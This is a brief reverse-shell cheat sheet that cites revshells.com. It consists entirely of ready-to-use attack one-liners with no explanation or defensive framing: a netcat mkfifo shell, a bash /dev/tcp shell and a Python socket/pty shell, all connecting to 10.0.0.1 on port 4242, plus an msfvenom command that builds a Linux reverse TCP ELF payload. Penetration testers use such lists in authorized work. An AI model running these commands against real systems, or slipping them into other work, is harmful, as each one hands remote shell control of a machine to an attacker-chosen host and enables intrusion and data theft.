https://www.revshells.com/

Always works if there is nc:
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

Basic bash:
```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

Python:
```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

MSFVenom payloads
```bash
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=192.168.49.135 LPORT=445
```